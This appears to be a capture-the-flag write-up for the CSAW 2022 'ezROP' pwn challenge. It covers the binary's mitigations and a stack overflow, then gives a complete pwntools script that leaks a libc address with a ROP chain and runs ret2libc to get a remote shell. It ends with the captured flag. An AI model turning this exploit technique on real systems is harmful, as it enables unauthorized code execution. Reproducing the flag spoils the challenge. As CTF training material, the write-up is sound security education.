---
title: "[Pwn] ezROP [CSAW CTF Qual 2022]"
date: 2022-09-11 16:35:00
---

# 0x0 Introduction

This is a simple buffer overflow challenge, but I wrote it in a reversed way :)

nc pwn.chal.csaw.io 5002

Files: [share.zip](share.zip)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerability

We have a 0x9c byte buffer overflow in `vuln()`. 

With no PIE and noe canary, we have direct control to RIP. 

Therefore, make a ROP chain to leak libc address, then perform a ret2libc to get a shell.

# 0x3 Exploit

```python
from pwn import *

exe = ELF("ezROP")
exe_rop = ROP(exe)
# libc = ELF("libc6_2.31-0ubuntu9.7_amd64.so")
libc = ELF("libc6_2.31-0ubuntu9.9_amd64.so")

# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print
def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("pwn.chal.csaw.io", 5002)
    return r

ret_addr = exe_rop.find_gadget(['ret'])[0]
pop_rdi_ret_addr = 0x00000000004015a3
pop_rsi_r14_ret_addr = 0x00000000004015a1

io = start()
io.sendafter(b"name?\n",flat({
    0: b'\n',
    8: b'AAAAAAAA',
    0x70+0x8: [
        ret_addr,
        pop_rdi_ret_addr,
        exe.got["printf"],
        exe.plt["printf"],
        ret_addr,
        exe.sym["main"]
    ]
}))
io.recvuntil(b"22!\n")
libc.address = int.from_bytes(io.recvuntil(b"My",drop=True),"little") - libc.sym["printf"]
print(hex(libc.address))
io.sendafter(b"name?\n",flat({
    0: b'\n',
    8: b'AAAAAAAA',
    0x70+0x8: [
        ret_addr,
        pop_rdi_ret_addr,
        next(libc.search(b"/bin/sh")),
        libc.sym["system"],
    ]
}))
io.interactive()
```


# 0x4 Flag

`flag{53bb4218b851affb894fad151652dc333a024990454a0ee32921509a33ebbeb4}`